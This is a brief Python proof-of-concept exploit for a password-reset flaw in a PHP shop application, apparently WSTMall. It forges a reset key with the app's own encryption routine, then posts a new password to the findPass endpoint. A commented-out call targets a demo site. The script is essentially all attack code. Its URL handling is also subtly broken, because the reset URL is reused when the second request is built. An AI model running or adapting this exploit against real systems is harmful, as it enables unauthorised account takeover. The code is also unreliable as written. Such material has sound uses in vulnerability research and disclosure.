#coding=utf8
#precodition：
#use C:\phpStudy\WWW\Apps\Home\Action\UsersAction.class.php line 352 encrypt function
#"$key = $keyFactory->encrypt("0_".session('findPass.userId')."_".time(),C('SESSION_PREFIX'),30*60);"
#produce payload in real time to replace payload param in poc function

import os
import requests

def poc(url):
    payload='hIqMqX6leayznZXcsotyloTes5mxubfZr3x-qIR7otyEh3Rv'#####need to be replaced
    url=url+"/index.php?m=Home&c=Users&a=toResetPass&key="+payload
    url2=url+"/index.php?m=Home&c=Users&a=findPass"
    s=requests.Session()
    reset=s.get(url)
    poc={'step':'3','loginPwd':'123456','repassword':'123456'}
    result=s.post(url2,data=poc)
    if 'Powered' in result.text:
        #print "[+]reset successfully"
        return True
      
#poc('http://demo.wstmall.com')

        

